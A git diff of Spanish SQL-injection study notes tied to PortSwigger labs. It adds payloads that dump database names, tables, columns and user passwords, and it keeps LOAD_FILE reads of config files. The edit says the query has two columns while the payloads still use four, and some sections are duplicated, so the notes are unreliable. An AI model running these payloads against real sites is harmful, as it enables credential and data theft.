@@ -32,21 +32,96 @@ https://web-security-academy.net/filter?category=Gifts)
 Comprobamos que el parámetro `port_code` es vulnerable inyectando un UNION SELECT.
 
 ```sql
-' UNION SELECT 1,2,3,4-- -
-````
+' UNION SELECT 1,2-- -
+```
 
 **Explicación:**
 
-Si la inyección tiene éxito, la página mostrará los valores `2`, `3` y `4` en la tabla. Esto confirma que:
+Si la inyección tiene éxito, la página mostrará los valores `1` y `2`  en la tabla. Esto confirma que:
 
 - La aplicación concatena directamente el valor en una consulta SQL.
     
-- El número de columnas es 4.
+- El número de columnas es 2.
     
 - Podemos continuar con otras inyecciones más complejas.
     
 
 ---
+
+### Obtener versión de MySQL
+
+```sql
+' UNION SELECT 1, @@version, 3, 4-- -
+```
+
+### Listar todas las bases de datos
+
+```sql
+' UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata-- -
+```
+Al ejecutar esta query, en el laboratorio de ejemplo de Portswigger vemos algo así:
+
+**Query realizada**
+
+![Captura](./Imágenes/web_1.png)
+
+**Bases de datos existentes**
+
+![Captura](./Imágenes/web_2.png)
+
+### Listar tablas de una base de datos
+
+```sql
+' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema='nombre_base_datos'-- -
+```
+
+**Query realizada**
+
+![Captura](./Imágenes/web_3.png)
+
+**Tablas existentes en la base de datos 'academy_labs'**
+
+![Captura](./Imágenes/web_4.png)
+
+### Listar columnas de una tabla
+
+```sql
+' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='nombre_tabla'-- -
+```
+
+### Extraer usuarios de una tabla `users`
+
+```sql
+' UNION SELECT 1, username, password, 4 FROM users-- -
+```
+
+---
+
+## Resumen de payloads usados
+
+```sql
+1. ' UNION SELECT 1,2,3,4-- -
+2. ' UNION SELECT 1, @@version, 3, 4-- -
+3. ' UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata-- -
+4. ' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema='nombre_base_datos'-- -
+5. ' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='nombre_tabla'-- -
+6. ' UNION SELECT 1, username, password, 4 FROM users-- -
+```
+
+
+---
+
+## Otras queries útiles para SQLi (bonus)
+
+## 1. Confirmación de la vulnerabilidad
+
+**Acción:**
+
+Comprobamos que el parámetro `port_code` es vulnerable inyectando un UNION SELECT.
+
+```sql
+' UNION SELECT 1,2-- -
+```
 
 ## 2. Comprobar privilegios del usuario `root` en MySQL
 
@@ -131,59 +206,6 @@ $db_pass = "toor123";
 
 Esto te permite conectarte directamente a la base de datos desde consola o herramientas como `sqlmap`.
 
----
-
-## Otras queries útiles para SQLi (bonus)
-
-### Obtener versión de MySQL
-
-```sql
-' UNION SELECT 1, @@version, 3, 4-- -
-```
-
-### Listar todas las bases de datos
-
-```sql
-' UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata-- -
-```
-Al ejecutar esta query, en el laboratorio de ejemplo de Portswigger vemos algo así:
-
-**Query realizada**
-
-![Captura](./Imágenes/web_1.png)
-
-**Bases de datos existentes**
-
-![Captura](./Imágenes/web_2.png)
-
-### Listar tablas de una base de datos
-
-```sql
-' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema='nombre_base_datos'-- -
-```
-
-**Query realizada**
-
-![Captura](./Imágenes/web_3.png)
-
-**Tablas existentes en la base de datos 'academy_labs'**
-
-![Captura](./Imágenes/web_4.png)
-
-### Listar columnas de una tabla
-
-```sql
-' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='nombre_tabla'-- -
-```
-
-### Extraer usuarios de una tabla `users`
-
-```sql
-' UNION SELECT 1, username, password, 4 FROM users-- -
-```
-
----
-
 ## Resumen de payloads usados
 
 ```sql
@@ -194,6 +216,7 @@ Al ejecutar esta query, en el laboratorio de ejemplo de Portswigger vemos algo a
 5. ' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
 6. ' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
 ```
+
 
 ---
 
